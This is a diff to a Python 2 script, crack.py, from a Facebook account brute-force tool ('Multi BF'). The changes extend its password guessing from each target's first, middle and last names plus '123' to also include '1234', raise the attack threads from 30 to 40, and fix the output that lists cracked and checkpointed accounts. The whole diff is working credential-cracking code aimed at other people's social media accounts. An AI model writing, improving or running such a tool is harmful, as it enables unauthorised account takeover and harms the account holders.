@@ -5,7 +5,8 @@
 # Name           : Multi BF (MBF) <cookie method>     #
 # File           : crack.py                           #
 # Author         : DulLah                             #
-# Github         : https://github.com/dz-id           #
+# Recoder        : SkyMatz                            #
+# Github         : https://github.com/skymatz        #
 # Facebook       : https://www.facebook.com/dulahz    #
 # Telegram       : https://t.me/unikers               #
 # Python version : 2.7                                #
@@ -93,25 +94,25 @@ class Brute:
 				obj = user['name'].split(' ')
 				if len(obj) == 1:
 					listpass = [
-						obj[0]+'123',
+						obj[0]+'123', obj[0]+'1234'
 					]
 				elif len(obj) == 2:
 					listpass = [
-						obj[0]+'123',
-						obj[1]+'123',
+						obj[0]+'123', obj[0]+'1234',
+						obj[1]+'123', obj[1]+'1234'
 					]
 				elif len(obj) == 3:
 					listpass = [
-						obj[0]+'123',
-						obj[1]+'123',
-						obj[2]+'123',
+						obj[0]+'123', obj[0]+'1234',
+						obj[1]+'123', obj[1]+'1234',
+						obj[2]+'123', obj[2]+'1234'
 					]
 				elif len(obj) == 4:
 					listpass = [
-						obj[0]+'123',
-						obj[1]+'123',
-						obj[2]+'123',
-						obj[3]+'123',
+						obj[0]+'123', obj[0]+'1234',
+						obj[1]+'123', obj[1]+'1234',
+						obj[2]+'123', obj[2]+'1234',
+						obj[3]+'123', obj[3]+'1234'
 					]
 				else:
 					listpass = [
@@ -130,7 +131,7 @@ class Brute:
 				if self.setpw[0] != '':
 					break
 				
-		th(30).map(self.brute, self.target)
+		th(40).map(self.brute, self.target)
 		self.results()
 		exit()
 
@@ -144,4 +145,4 @@ class Brute:
 			for i in self.cp: print('\033[0;93m### '+str(i)+'\033[0m')
 			print('Your CP results saved in: out/cp.txt')
 		if (len(self.cp) == 0 and len(self.ok) == 0):
-			print('\n\n033[0;91mNo results found :(\033[0m')
+			print('\n\n\033[0;91mNo results found :(\033[0m')
